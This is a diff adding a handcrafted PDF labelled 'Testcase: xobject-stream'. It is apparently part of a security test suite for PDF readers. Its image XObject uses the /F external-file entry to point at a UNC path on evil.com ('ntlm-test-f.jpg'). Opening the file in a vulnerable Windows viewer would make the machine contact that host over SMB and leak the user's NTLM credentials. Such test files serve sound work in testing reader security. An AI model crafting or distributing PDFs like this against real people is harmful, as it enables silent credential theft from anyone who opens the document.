@@ -1,0 +1,85 @@
+%PDF-1.7
+
+1 0 obj
+  << /Type /Catalog
+     /Pages 2 0 R
+  >>
+endobj
+
+2 0 obj
+  << /Type /Pages
+     /Kids [3 0 R]
+     /Count 1
+     /MediaBox [0 0 595 842]
+  >>
+endobj
+
+3 0 obj
+  << /Type /Page
+     /Parent 2 0 R
+     /Resources
+      << /XObject << /LFI 6 0 R >>
+         /Font
+          << /F1
+              << /Type /Font
+                 /Subtype /Type1
+                 /BaseFont /Courier
+              >>
+          >>
+      >>
+     /Contents [4 0 R 5 0 R]
+  >>
+endobj
+
+4 0 obj
+  << /Length 74 >>
+stream
+  BT
+    /F1 22 Tf
+    30 800 Td
+    (Testcase: 'xobject-stream') Tj
+  ET
+endstream
+endobj
+
+5 0 obj
+  << /Length 47 >>
+stream
+  q
+    390 0 0 390 100 350 cm
+    /LFI Do
+  Q
+endstream
+endobj
+
+6 0 obj
+  << /Type /XObject
+     /Subtype /Image
+     /Width 500
+     /Height 500
+     /FFilter /DCTDecode
+     /BitsPerComponent 8
+     /ColorSpace /DeviceRGB
+     /F (\\\\evil.com\\ntlm-test-f.jpg)
+     /Length 0
+  >>
+stream
+endstream
+endobj
+
+xref
+0 7
+0000000000 65535 f 
+0000000010 00000 n 
+0000000069 00000 n 
+0000000170 00000 n 
+0000000476 00000 n 
+0000000602 00000 n 
+0000000701 00000 n 
+trailer
+  << /Root 1 0 R
+     /Size 7
+  >>
+startxref
+945
+%%EOF
